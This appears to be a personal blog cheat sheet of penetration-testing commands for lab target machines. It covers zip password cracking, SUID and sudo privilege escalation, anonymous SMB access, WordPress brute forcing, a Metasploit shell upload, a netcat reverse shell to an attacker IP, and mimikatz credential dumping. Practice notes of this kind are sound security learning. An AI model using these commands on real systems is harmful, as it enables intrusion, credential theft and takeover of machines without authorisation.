---
title: 靶机日记 | ToolKits
categories:
  - Technical
tags:
  - Digilal Design
  - EEEE
date: 2021-02-25 14:14:24
---

### 1. Crack the Passwd of Zip Package

```bash
zip2john backup.zip > passwd.txt
john passwd.txt
```

### 2. Find

1. Find file with suid

```bash
find / -perm -u=s 2>/dev/null
```

If we got it ，we can go to [GTFobins](https://gtfobins.github.io) to check out whether it is possible for Privilege Escalation

2. Find file for special group

``` bash
find / -type f -group bugtracker 2>/dev/null
```

3. Find file

```bash
# linux
find / -name "user.txt"
```

```powershell
# powershell
Get-ChildItem  -Recurse –Filter user.txt
```

<!-- more -->

### 3. smb

If the target machine with port 445 opened, we can check out the file under directory if no auth：

```bash
smbclient -N -L ////ip
```

and then dump file from directory:

```bash
smbclient  \\\\10.10.10.27\\backup/
get filename
```

### 4. Upgrade Shell to tty

```bash
SHELL=/bin/bash script -q /dev/null
# or
python3 -c "import pty;pty.spawn('/bin/bash')"
```

### 5. Sudo

view the special permissions of current role:

```bash
sudo -l
```

When a command can be executed with sudo , we can use this command to open a new bash shell to get root privilege .

For example,  `! /bin/bash` in Vim.

### 6. Website

Search for subdirectory

```bash
gobuster dir -u http://10.10.10.29 -w /usr/share/wordlists/dirb/big.txt
```

Analyze

```bash
nikto -host http://10.10.10.28 -o _28.html
```

#### WordPress

Enumerate accounts and Brute Force the password

```bash
wpscan --url http://10.10.10.29/wordpress --enumerate
```

```bash
wpscan --url http://10.10.10.29/wordpress -U users.txt -P backupPasswords
```

use metasploit

```bash
use exploit/unix/webapp/wp_admin_shell_upload
```

### NetCat

Reverse:

```bash
nc.exe -a "-e cmd.exe 10.10.16.4 7777"
```

Listen:

```zsh
nc -lvpn 4444
```

### Dump Cached password

```poershell
./mimikatz.exe
```

